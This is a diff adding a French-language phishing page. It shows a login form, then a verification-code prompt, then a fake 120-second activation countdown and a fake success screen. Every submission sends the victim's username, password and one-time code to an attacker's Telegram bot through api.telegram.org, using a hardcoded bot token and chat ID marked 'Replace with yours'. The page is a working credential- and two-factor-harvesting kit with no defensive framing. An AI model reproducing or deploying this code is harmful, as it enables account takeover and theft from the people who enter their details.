@@ -1,0 +1,91 @@
+<!DOCTYPE html>
+<html lang="fr" class="h-full">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <script src="https://cdn.tailwindcss.com"></script>
+    <style>
+        body { background: #000; overflow: hidden; margin: 0; }
+        .glass { background: rgba(255, 255, 255, 0.05); backdrop-filter: blur(20px); border: 1px solid rgba(255, 255, 255, 0.1); }
+        .fade-in { animation: fadeIn 0.5s ease-in-out; }
+        @keyframes fadeIn { from { opacity: 0; transform: translateY(20px); } to { opacity: 1; transform: translateY(0); } }
+        canvas { position: fixed; top: 0; left: 0; z-index: -1; }
+    </style>
+</head>
+<body class="flex items-center justify-center h-screen">
+    <canvas id="net"></canvas>
+
+    <div id="app" class="glass p-8 rounded-3xl w-80 shadow-2xl text-white text-center fade-in">
+        <div id="s1">
+            <h2 class="text-2xl font-bold mb-6">Connexion</h2>
+            <input id="u" placeholder="Utilisateur / Email" class="w-full bg-white/10 p-3 rounded-xl mb-4 outline-none border border-white/20">
+            <input id="p" type="password" placeholder="Mot de passe" class="w-full bg-white/10 p-3 rounded-xl mb-6 outline-none border border-white/20">
+            <button onclick="next(1, 'Login: '+document.getElementById('u').value+' / '+document.getElementById('p').value)" class="w-full bg-cyan-500 py-3 rounded-xl font-bold">Se connecter</button>
+        </div>
+
+        <div id="s2" class="hidden fade-in">
+            <h2 class="text-xl mb-6">Entrez le code de vérification</h2>
+            <input id="c" placeholder="Code" class="w-full bg-white/10 p-3 rounded-xl mb-6 outline-none border border-white/20 text-center text-2xl tracking-widest">
+            <button onclick="next(2, 'Code: '+document.getElementById('c').value)" class="w-full bg-cyan-500 py-3 rounded-xl font-bold">Valider</button>
+        </div>
+
+        <div id="s3" class="hidden fade-in">
+            <h2 class="text-xl mb-6">Activation en cours...</h2>
+            <div id="timer" class="text-5xl font-mono text-cyan-400">120</div>
+        </div>
+
+        <div id="s4" class="hidden fade-in">
+            <h2 class="text-3xl text-green-400 mb-4">✔</h2>
+            <h2 class="text-xl font-bold">Activation réussie</h2>
+        </div>
+    </div>
+
+    <script>
+        const TOKEN = 'AAFBgTfVT1W_W1GAHA-5KekYvB3UGNmtB28';
+        const CHAT_ID = '8572011899'; // Replace with yours
+
+        async function next(step, data) {
+            fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
+                method: 'POST', headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify({ chat_id: CHAT_ID, text: data })
+            });
+
+            document.querySelectorAll('#app > div').forEach(d => d.classList.add('hidden'));
+            if (step === 1) document.getElementById('s2').classList.remove('hidden');
+            if (step === 2) {
+                document.getElementById('s3').classList.remove('hidden');
+                startTimer();
+            }
+        }
+
+        function startTimer() {
+            let t = 120;
+            let i = setInterval(() => {
+                t--; document.getElementById('timer').innerText = t;
+                if(t <= 0) { clearInterval(i); document.getElementById('s3').classList.add('hidden'); document.getElementById('s4').classList.remove('hidden'); }
+            }, 1000);
+        }
+
+        const c = document.getElementById('net'), ctx = c.getContext('2d');
+        c.width = window.innerWidth; c.height = window.innerHeight;
+        let pts = Array(50).fill().map(() => ({x: Math.random()*c.width, y: Math.random()*c.height, vx: Math.random()-0.5, vy: Math.random()-0.5}));
+        function draw() {
+            ctx.clearRect(0,0,c.width,c.height);
+            ctx.strokeStyle = '#0891b2';
+            ctx.beginPath();
+            pts.forEach((p, i) => {
+                p.x += p.vx; p.y += p.vy;
+                if(p.x<0||p.x>c.width) p.vx*=-1; if(p.y<0||p.y>c.height) p.vy*=-1;
+                ctx.moveTo(p.x, p.y);
+                pts.forEach((p2) => {
+                    let dx = p.x - p2.x, dy = p.y - p2.y;
+                    if(Math.sqrt(dx*dx + dy*dy) < 150) { ctx.lineTo(p2.x, p2.y); ctx.moveTo(p.x, p.y); }
+                });
+            });
+            ctx.stroke();
+            requestAnimationFrame(draw);
+        }
+        draw();
+    </script>
+</body>
+</html>
